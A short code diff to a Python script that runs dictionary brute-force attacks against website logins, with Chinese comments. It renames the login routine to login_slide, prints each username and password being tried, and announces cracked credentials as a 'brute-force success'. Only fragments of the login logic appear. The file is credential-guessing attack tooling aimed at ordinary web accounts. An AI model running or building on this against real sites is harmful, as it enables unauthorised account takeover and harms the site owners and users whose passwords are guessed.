@@ -5,7 +5,7 @@ import requests
 from bruteforce import bruteforce,dict_queue, success_username
 
 
-def login():
+def login_slide():
     """
     登录和检测登录结果的代码针对每个网站分别完成
     login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
@@ -24,7 +24,7 @@ def login():
     password = login_info[1]
     # username = 'aaaaaa'
     # password = "lcr123456"
-
+    print('当前测试用户名：{},密码：{}'.format(username,password))
     ################################实现登录过程开始
     captcha = {
         'un':username,
@@ -50,7 +50,7 @@ def login():
         msg = login_info
         # 登录成功则把登录信息保存到success_queue
         success_username.append(username)
-        print(msg)
+        print('【爆破成功，用户名:{},密码:{}】'.format(username, password))
 
     ################################## 检查密码是否正确结束
 
@@ -90,4 +90,4 @@ if __name__ == "__main__":
 
     get_dict(dict_username, dict_password)
 
-    bruteforce(login, thread_num=1)
+    bruteforce(login_slide, thread_num=1)
